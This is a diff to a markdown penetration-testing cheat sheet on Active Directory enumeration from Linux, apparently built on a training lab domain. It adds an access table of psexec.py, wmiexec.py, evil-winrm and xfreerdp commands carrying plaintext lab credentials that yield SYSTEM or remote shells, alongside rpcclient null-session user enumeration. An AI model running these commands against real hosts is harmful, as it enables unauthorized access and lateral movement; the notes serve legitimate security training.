@@ -4,7 +4,23 @@
 
 Enumerating a domain from a Linux host with valid creds. Related: [enumeration](enumeration.md) · [netexec](NetExec.md) · [password-spraying](password-spraying.md) · [common-services](../Network/common-services.md)
 
+## Contents
+- [Access](#access)
+- [Shares](#shares)
+- [Users / Groups / RPC](#users--groups--rpc)
+- [BloodHound (credentialed)](#bloodhound-credentialed)
+- [Living off the Land (Windows, no tools)](#living-off-the-land-windows-no-tools)
+- [File Transfer Helpers](#file-transfer-helpers)
+
 ## Access
+
+| Tool | Command | Gives you |
+|---|---|---|
+| xfreerdp | `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Full RDP desktop session |
+| psexec.py | `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125` | SYSTEM shell via ADMIN$ share (Impacket) |
+| wmiexec.py | `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5` | Semi-interactive shell via WMI (Impacket) |
+| evil-winrm | `evil-winrm -i 10.129.201.234 -u forend` | PowerShell session over WinRM |
+
 ```bash
 xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25
 ```
@@ -47,12 +63,12 @@ rpcclient -U "" -N 172.16.5.5
 ```
 Connect via SMB NULL session.
 
-```
+```text
 rpcclient $> enumdomusers
 ```
 Enumerate domain users and RIDs.
 
-```
+```text
 rpcclient $> queryuser 0x457
 ```
 Query a user by RID.
